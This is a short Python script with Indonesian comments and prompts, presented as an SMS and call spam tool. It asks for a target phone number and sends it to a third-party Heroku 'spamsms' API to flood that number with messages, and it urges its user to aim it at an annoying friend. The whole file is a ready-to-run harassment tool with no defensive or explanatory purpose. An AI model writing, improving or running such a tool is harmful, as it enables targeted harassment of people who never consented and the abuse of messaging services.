import os
import time
import requests

#logo
os.system ('clear')
print ("\033[1;36;40m CREATOR BY : AL.M.GAMING. 12")
os.system ('date | lolcat')
print ("\033[1;36;40m CHANNEL    : https://is.gd/8zvFxE")
print ("\033[1;36;40m LIVE AT    : LAMPUNG")
print (" spam       : call and sms")
print ("---------------------------------------------")
print ("\n[+] gunakan pas ada temen yg ngeselin ")
print ("[+] tanggung sendiri akibat nya ")
print ("[+] nomor diawali 8xxx bukan 0 atau +62")

# Run nomer
nomor = input ("[+] nomor target :")
req=requests.get("https://ainxbot-sms.herokuapp.com/api/spamsms",params={"phone":nomor}).text
if "terkirim" in req:
    print ("[√]sukses terkirim")
else:
    print ("[X]gagal mengirim")
    print ("HARAP COBA LAGI")

